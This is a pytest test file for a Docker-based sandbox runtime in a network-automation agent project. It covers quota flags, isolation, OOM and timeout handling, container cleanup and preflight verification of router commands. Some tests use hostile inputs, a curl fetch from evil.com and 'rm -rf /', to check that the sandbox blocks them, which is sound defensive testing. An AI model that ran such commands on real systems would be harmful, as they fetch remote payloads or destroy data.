"""Unit and Integration Tests for OpenHands-Inspired Docker Sandbox Runtime (Day-3 M1).

Verifies:
1. ResourceQuota constraints and CLI flag / dictionary exports.
2. SandboxExecutionResult, GCReport, and PreflightSandboxPassReport data models.
3. MockSandboxRuntime isolation (--network none), OOM quota enforcement, timeout handling.
4. DockerSandboxRuntime container startup with --network none, cgroups limits, exec, and cleanup.
5. AutoGarbageCollector discovery, TTL evaluation, orphan removal, and image pruning.
6. ShadowSandboxManager preflight verification producing certified pass reports.
7. Zero regressions across all legacy and new sandbox interfaces.
"""

from pathlib import Path
import time
from typing import Any, List
from unittest.mock import MagicMock, patch
import pytest

from langgraph_netagent.models.operational import ShadowSandboxResult
from langgraph_netagent.models.sandbox import (
    GCReport,
    PreflightSandboxPassReport,
    ResourceQuota,
    SandboxExecutionResult,
)
from langgraph_netagent.tools.aal import AgentAccessLayer
from langgraph_netagent.tools.base import CommandResult
from langgraph_netagent.tools.mock_engine import MockContainerlabAdapter
from langgraph_netagent.tools.runner import SubprocessRunner
from langgraph_netagent.tools.sandbox import ShadowSandboxManager
from langgraph_netagent.tools.sandbox_runtime import (
    AutoGarbageCollector,
    DockerRuntimeError,
    DockerSandboxRuntime,
    DockerUnavailableError,
    MockSandboxRuntime,
    create_sandbox_runtime,
    is_docker_available,
)


@pytest.fixture
def deployed_mock_adapter():
    adapter = MockContainerlabAdapter()
    for candidate in [
        Path(__file__).resolve().parent.parent / "clab_output" / "netagent-lab.clab.yml",
        Path(__file__).resolve().parent.parent.parent / "clab_output" / "netagent-lab.clab.yml",
    ]:
        if candidate.exists():
            adapter.deploy(candidate)
            break
    return adapter


@pytest.fixture
def aal(deployed_mock_adapter):
    return AgentAccessLayer(lab_adapter=deployed_mock_adapter)


# =============================================================================
# 1. ResourceQuota and Model Tests
# =============================================================================

class TestResourceQuota:
    """Verify cgroups resource quota definitions and conversion methods."""

    def test_default_quotas(self):
        quota = ResourceQuota()
        assert quota.nano_cpus == 1_000_000_000
        assert quota.mem_limit == "512m"
        assert quota.pids_limit == 100
        assert quota.tmpfs_size == "64m"

    def test_to_docker_flags(self):
        quota = ResourceQuota(
            nano_cpus=2_000_000_000,
            mem_limit="1024m",
            pids_limit=200,
            tmpfs_size="128m",
        )
        flags = quota.to_docker_flags()
        assert "--cpus=2" in flags
        assert "--memory=1024m" in flags
        assert "--memory-swap=1024m" in flags
        assert "--pids-limit=200" in flags
        assert "--tmpfs=/tmp:rw,size=128m,mode=1777" in flags

    def test_to_docker_kwargs(self):
        quota = ResourceQuota()
        kwargs = quota.to_docker_kwargs()
        assert kwargs["nano_cpus"] == 1_000_000_000
        assert kwargs["mem_limit"] == "512m"
        assert kwargs["pids_limit"] == 100
        assert "/tmp" in kwargs["tmpfs"]

    def test_to_dict_contract(self):
        quota = ResourceQuota(nano_cpus=1_000_000_000, mem_limit="512m", pids_limit=100)
        d = quota.to_dict()
        assert d["cpu_limit"] == "1.0"
        assert d["mem_limit"] == "512m"
        assert d["pids_limit"] == 100
        assert d["nano_cpus"] == 1_000_000_000


class TestSandboxDataModels:
    """Verify execution result, GC report, and preflight pass report schemas."""

    def test_sandbox_execution_result_properties(self):
        res = SandboxExecutionResult(
            exit_code=0,
            stdout="success_out",
            stderr="",
            duration_sec=0.123,
            timed_out=False,
            command="ip route",
        )
        assert res.success is True
        assert res.is_timeout is False
        assert res.duration_seconds == 0.123

    def test_sandbox_execution_result_timeout(self):
        res = SandboxExecutionResult(
            exit_code=-1,
            stdout="",
            stderr="Command timed out after 10s",
            duration_sec=10.0,
            timed_out=True,
            command="sleep 100",
        )
        assert res.success is False
        assert res.is_timeout is True

    def test_gc_report_properties(self):
        report = GCReport(
            containers_removed=["c1", "c2"],
            images_pruned=["img1"],
            reclaimed_bytes=1024 * 1024,
            errors=[],
            scanned_containers_count=2,
        )
        assert report.removed_containers == ["c1", "c2"]
        assert report.pruned_images == ["img1"]
        assert report.reclaimed_bytes == 1024 * 1024
        assert len(report.errors) == 0

    def test_preflight_pass_report_auto_signature(self):
        report = PreflightSandboxPassReport(
            sandbox_id="sbx-123",
            target_node="frr1",
            commands_executed=["ip route add 10.0.0.0/24 via 192.168.1.1"],
            all_passed=True,
            exit_codes=[0],
            execution_duration_sec=0.45,
            network_isolated=True,
            resource_quotas={"cpu_limit": "1.0", "mem_limit": "512m"},
        )
        assert report.all_passed is True
        assert report.network_isolated is True
        assert len(report.pass_signature) == 32
        # Deterministic verification
        expected = PreflightSandboxPassReport.compute_pass_signature(
            sandbox_id="sbx-123",
            target_node="frr1",
            commands=["ip route add 10.0.0.0/24 via 192.168.1.1"],
            exit_codes=[0],
            timestamp=report.timestamp,
        )
        assert report.pass_signature == expected

    def test_preflight_fail_report_no_signature(self):
        report = PreflightSandboxPassReport(
            sandbox_id="sbx-fail",
            target_node="frr1",
            commands_executed=["bad_cmd"],
            all_passed=False,
            exit_codes=[127],
            execution_duration_sec=0.1,
            error_message="Command failed",
        )
        assert report.all_passed is False
        assert report.pass_signature == ""


# =============================================================================
# 2. MockSandboxRuntime Isolation and Behavior Tests
# =============================================================================

class TestMockSandboxRuntime:
    """Verify behavior of in-memory sandbox runtime."""

    def test_context_manager_lifecycle(self):
        runtime = MockSandboxRuntime(target_node="frr1")
        assert runtime.is_running is False
        with runtime:
            assert runtime.is_running is True
        assert runtime.is_running is False

    def test_successful_command_execution(self):
        with MockSandboxRuntime(target_node="frr1") as runtime:
            res = runtime.exec_command("ip route add 10.5.0.0/24 via 10.1.1.2")
            assert res.exit_code == 0
            assert res.success is True
            assert "ip route" in res.stdout
            assert res.stderr == ""
            assert res.duration_sec >= 0.0

    def test_network_isolation_blocks_external_egress(self):
        """Pre-flight verification must block external network connectivity under --network none."""
        with MockSandboxRuntime(target_node="frr1", network_mode="none") as runtime:
            # pinging external IP must fail immediately with Network is unreachable
            res = runtime.exec_command("ping -c 3 8.8.8.8")
            assert res.exit_code != 0
            assert "Network is unreachable" in res.stderr
            assert "--network none" in res.stderr

            # curl to remote endpoint must fail
            res_curl = runtime.exec_command("curl https://evil.com/payload")
            assert res_curl.exit_code != 0
            assert "Network is unreachable" in res_curl.stderr

    def test_network_isolation_allows_loopback(self):
        """Loopback address (127.0.0.1) remains reachable under --network none."""
        with MockSandboxRuntime(target_node="frr1", network_mode="none") as runtime:
            res = runtime.exec_command("ping -c 1 127.0.0.1")
            assert res.exit_code == 0
            assert "64 bytes from 127.0.0.1" in res.stdout

    def test_cgroups_quota_oom_trap(self):
        """Simulate a memory bomb inside sandbox; triggers exit code 137 (OOM killed)."""
        with MockSandboxRuntime(target_node="frr1") as runtime:
            res = runtime.exec_command("stress --vm 2 --vm-bytes 1024M")
            assert res.exit_code == 137
            assert "Out of memory" in res.stderr
            assert "quota exceeded" in res.stderr

    def test_timeout_enforcement(self):
        """Simulate an infinite loop; triggers timeout handling with exit code -1."""
        with MockSandboxRuntime(target_node="frr1") as runtime:
            res = runtime.exec_command("sleep 999", timeout=5)
            assert res.exit_code == -1
            assert res.timed_out is True
            assert "Command timed out" in res.stderr

    def test_destructive_command_blocking(self):
        """Destructive operations are blocked with exit code 126."""
        with MockSandboxRuntime(target_node="frr1") as runtime:
            res = runtime.exec_command("rm -rf /")
            assert res.exit_code == 126
            assert "SECURITY POLICY VIOLATION" in res.stderr

    def test_invalid_command_exit_code(self):
        with MockSandboxRuntime(target_node="frr1") as runtime:
            res = runtime.exec_command("invalid_cmd_xyz")
            assert res.exit_code == 127
            assert "not found" in res.stderr


# =============================================================================
# 3. DockerSandboxRuntime Command Construction and Execution Tests
# =============================================================================

class TestDockerSandboxRuntime:
    """Verify DockerSandboxRuntime command formulation, isolation, quotas, and cleanup."""

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_run_arguments_contain_isolation_and_quotas(self, mock_available):
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.return_value = CommandResult(
            command="docker run",
            exit_code=0,
            stdout="container-abc-123\n",
            stderr="",
            duration_seconds=0.5,
        )

        quota = ResourceQuota(
            nano_cpus=1_000_000_000,
            mem_limit="512m",
            pids_limit=100,
            tmpfs_size="64m",
        )

        runtime = DockerSandboxRuntime(
            target_node="frr1",
            image="frrouting/frr:v8.4.0",
            network_mode="none",
            quota=quota,
            runner=mock_runner,
            sandbox_id="test_sbx_001",
        )

        with runtime:
            assert runtime.is_running is True

        # Inspect docker run command called
        run_calls = [c for c in mock_runner.run.call_args_list if "docker run" in str(c)]
        assert len(run_calls) >= 1
        cmd_str = run_calls[0].args[0] if run_calls[0].args else run_calls[0].kwargs.get("command", "")

        assert "--network none" in cmd_str
        assert "--cpus=1" in cmd_str
        assert "--memory=512m" in cmd_str
        assert "--memory-swap=512m" in cmd_str
        assert "--pids-limit=100" in cmd_str
        assert "--tmpfs=/tmp:rw,size=64m,mode=1777" in cmd_str
        assert "--label netops.sandbox=true" in cmd_str
        assert "--label netops.sandbox.id=test_sbx_001" in cmd_str
        assert "frrouting/frr:v8.4.0" in cmd_str

        # Inspect cleanup call
        rm_calls = [c for c in mock_runner.run.call_args_list if "docker rm -f" in str(c)]
        assert len(rm_calls) >= 1

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_exec_command_execution(self, mock_available):
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            CommandResult(command="docker run", exit_code=0, stdout="c1\n", stderr="", duration_seconds=0.2),
            CommandResult(command="docker exec", exit_code=0, stdout="10.1.1.0/24 dev eth1\n", stderr="", duration_seconds=0.05),
            CommandResult(command="docker rm -f", exit_code=0, stdout="", stderr="", duration_seconds=0.1),
        ]

        runtime = DockerSandboxRuntime(target_node="frr1", runner=mock_runner)
        with runtime:
            res = runtime.exec_command("ip route show")
            assert res.exit_code == 0
            assert "10.1.1.0/24" in res.stdout
            assert res.timed_out is False

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_docker_exec_timeout_handling(self, mock_available):
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            CommandResult(command="docker run", exit_code=0, stdout="c1\n", stderr="", duration_seconds=0.2),
            CommandResult(command="docker exec", exit_code=-1, stdout="", stderr="Command timed out after 5s", duration_seconds=5.0),
            CommandResult(command="docker rm -f", exit_code=0, stdout="", stderr="", duration_seconds=0.1),
        ]

        runtime = DockerSandboxRuntime(target_node="frr1", runner=mock_runner)
        with runtime:
            res = runtime.exec_command("sleep 100", timeout=5)
            assert res.exit_code == -1
            assert res.timed_out is True
            assert "timed out" in res.stderr.lower()

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=False)
    def test_docker_unavailable_raises_error(self, mock_available):
        runtime = DockerSandboxRuntime(target_node="frr1")
        with pytest.raises(DockerUnavailableError):
            runtime.start()


# =============================================================================
# 4. AutoGarbageCollector Tests
# =============================================================================

class TestAutoGarbageCollector:
    """Verify discovery and pruning of orphaned labeled containers and dangling images."""

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_auto_gc_cleans_orphaned_containers(self, mock_available):
        mock_runner = MagicMock(spec=SubprocessRunner)
        # 1. docker ps output with 2 containers
        ps_output = (
            "c_id_1|netops-sandbox-1|netops.sandbox=true,netops.sandbox.created_at=1000\n"
            "c_id_2|netops-sandbox-2|netops.sandbox=true,netops.sandbox.created_at=1000\n"
        )
        mock_runner.run.side_effect = [
            CommandResult(command="docker ps", exit_code=0, stdout=ps_output, stderr="", duration_seconds=0.1),
            CommandResult(command="docker rm -f c_id_1", exit_code=0, stdout="c_id_1", stderr="", duration_seconds=0.1),
            CommandResult(command="docker rm -f c_id_2", exit_code=0, stdout="c_id_2", stderr="", duration_seconds=0.1),
            CommandResult(command="docker images", exit_code=0, stdout="", stderr="", duration_seconds=0.1),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report: GCReport = gc.run_gc(ttl_seconds=600, force=True)

        assert len(report.containers_removed) == 2
        assert "netops-sandbox-1" in report.containers_removed
        assert "netops-sandbox-2" in report.containers_removed
        assert report.reclaimed_bytes > 0
        assert len(report.errors) == 0

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=True)
    def test_auto_gc_prunes_dangling_images(self, mock_available):
        mock_runner = MagicMock(spec=SubprocessRunner)
        mock_runner.run.side_effect = [
            CommandResult(command="docker ps", exit_code=0, stdout="", stderr="", duration_seconds=0.1),
            CommandResult(command="docker images -q", exit_code=0, stdout="sha256:dangling1\nsha256:dangling2\n", stderr="", duration_seconds=0.1),
            CommandResult(command="docker rmi -f", exit_code=0, stdout="Deleted: sha256:dangling1\n", stderr="", duration_seconds=0.2),
        ]

        gc = AutoGarbageCollector(runner=mock_runner)
        report: GCReport = gc.run_gc(ttl_seconds=600, force=True)

        assert len(report.images_pruned) == 2
        assert report.reclaimed_bytes > 0

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=False)
    def test_auto_gc_docker_unavailable_graceful(self, mock_available):
        gc = AutoGarbageCollector()
        report = gc.run_gc()
        assert len(report.containers_removed) == 0
        assert len(report.errors) == 1
        assert "Docker daemon unavailable" in report.errors[0]


# =============================================================================
# 5. create_sandbox_runtime Factory Tests
# =============================================================================

class TestCreateSandboxRuntimeFactory:
    """Verify factory runtime selection and graceful fallback."""

    def test_mode_mock_creates_mock_runtime(self):
        rt = create_sandbox_runtime(target_node="frr1", mode="mock")
        assert isinstance(rt, MockSandboxRuntime)
        assert rt.network_mode == "none"

    def test_mock_adapter_creates_mock_runtime(self, deployed_mock_adapter):
        rt = create_sandbox_runtime(target_node="frr1", mode="auto", adapter=deployed_mock_adapter)
        assert isinstance(rt, MockSandboxRuntime)

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=False)
    def test_mode_auto_with_docker_unavailable_falls_back_to_mock(self, mock_available):
        rt = create_sandbox_runtime(target_node="frr1", mode="auto")
        assert isinstance(rt, MockSandboxRuntime)

    @patch("langgraph_netagent.tools.sandbox_runtime.is_docker_available", return_value=False)
    def test_mode_live_with_docker_unavailable_raises_error(self, mock_available):
        with pytest.raises(DockerUnavailableError):
            create_sandbox_runtime(target_node="frr1", mode="live")


# =============================================================================
# 6. ShadowSandboxManager Pre-Flight Verification Tests
# =============================================================================

class TestShadowSandboxPreflight:
    """Verify ShadowSandboxManager preflight verification and report generation."""

    def test_preflight_verification_passes(self, deployed_mock_adapter, aal):
        commands = [
            "vtysh -c 'configure terminal' -c 'ip route 10.20.0.0/24 10.1.12.2'",
            "iptables -I FORWARD -s 192.168.1.100 -j DROP",
        ]
        report: PreflightSandboxPassReport = ShadowSandboxManager.run_preflight_verification(
            target_node="frr1",
            commands=commands,
            adapter=deployed_mock_adapter,
            aal=aal,
            quota=ResourceQuota(),
        )
        assert report.all_passed is True
        assert report.network_isolated is True
        assert report.target_node == "frr1"
        assert len(report.commands_executed) == 2
        assert report.exit_codes == [0, 0]
        assert len(report.pass_signature) == 32
        assert report.resource_quotas["mem_limit"] == "512m"

    def test_preflight_verification_blocks_destructive(self, deployed_mock_adapter, aal):
        commands = [
            "rm -rf /etc/frr/*",
        ]
        report: PreflightSandboxPassReport = ShadowSandboxManager.run_preflight_verification(
            target_node="frr1",
            commands=commands,
            adapter=deployed_mock_adapter,
            aal=aal,
        )
        assert report.all_passed is False
        assert len(report.exit_codes) == 1
        assert report.exit_codes[0] == 126
        assert report.pass_signature == ""
        assert "security policy" in (report.error_message or "").lower() or "blocked" in (report.error_message or "").lower()

    def test_preflight_verification_empty_commands_rejected(self, deployed_mock_adapter):
        report = ShadowSandboxManager.run_preflight_verification(
            target_node="frr1",
            commands=[],
            adapter=deployed_mock_adapter,
            allow_empty=False,
        )
        assert report.all_passed is False
        assert "No candidate commands" in (report.error_message or "")

    def test_preflight_verification_empty_commands_allowed(self, deployed_mock_adapter):
        report = ShadowSandboxManager.run_preflight_verification(
            target_node="frr1",
            commands=[],
            adapter=deployed_mock_adapter,
            allow_empty=True,
        )
        assert report.all_passed is True

    def test_backward_compatibility_run_sandbox_validation(self, deployed_mock_adapter, aal):
        """Ensure original run_sandbox_validation returns ShadowSandboxResult as expected."""
        res: ShadowSandboxResult = ShadowSandboxManager.run_sandbox_validation(
            target_node="frr1",
            patch_commands=["vtysh -c 'show ip route'"],
            adapter=deployed_mock_adapter,
            aal=aal,
        )
        assert isinstance(res, ShadowSandboxResult)
        assert res.all_passed is True
        assert res.cloned_node == "frr1"
